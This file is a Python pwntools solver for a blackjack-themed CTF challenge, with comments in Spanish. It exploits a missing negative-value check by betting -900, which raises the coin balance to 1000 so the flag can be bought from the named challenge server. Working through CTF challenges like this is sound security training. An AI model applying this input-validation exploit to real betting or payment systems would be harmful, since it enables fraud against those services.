#!/usr/bin/env python3
"""
Blackjack CTF Challenge Solver - FINAL
Objetivo: Obtener 1000 monedas para comprar la flag

VULNERABILIDAD ENCONTRADA:
- El código acepta float para las apuestas: bet = float(input(...))
- La validación es: if bet > coins (no check para negativos)
- Cuando pierdes: coins -= bet
- Si apostamos -900, entonces: 100 - (-900) = 1000 monedas
"""

from pwn import *
import time

HOST = "lottery.ctf.cert.unlp.edu.ar"
PORT = 35001

def exploit():
    """Exploit con negative bet"""
    con = remote(HOST, PORT, timeout=10)
    
    try:
        banner = con.recvuntil(b">", timeout=5)
        print("[+] Connected to server")
        print("[*] Exploit: Negative bet vulnerability")
        print("[*] If we bet -900, coins = 100 - (-900) = 1000\n")
        
        # Play a round
        con.sendline(b"1")
        time.sleep(0.2)
        con.recv(512, timeout=2)
        
        # Send negative bet (-900)
        con.sendline(b"-900")
        time.sleep(0.2)
        con.recv(256, timeout=2)
        
        # Guess any number (doesn't matter)
        con.sendline(b"0")
        time.sleep(0.2)
        resp = con.recv(512, timeout=2).decode(errors="replace")
        print("[*] Round result:")
        print(resp)
        
        # Buy flag
        con.sendline(b"2")
        time.sleep(0.2)
        result = con.recvall(timeout=3)
        
        print("\n[+] FLAG ACQUIRED:")
        print(result.decode(errors="replace"))
        
        con.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        try:
            con.close()
        except:
            pass

if __name__ == "__main__":
    print("[*] Blackjack CTF Solver - Negative Bet Exploit\n")
    exploit()
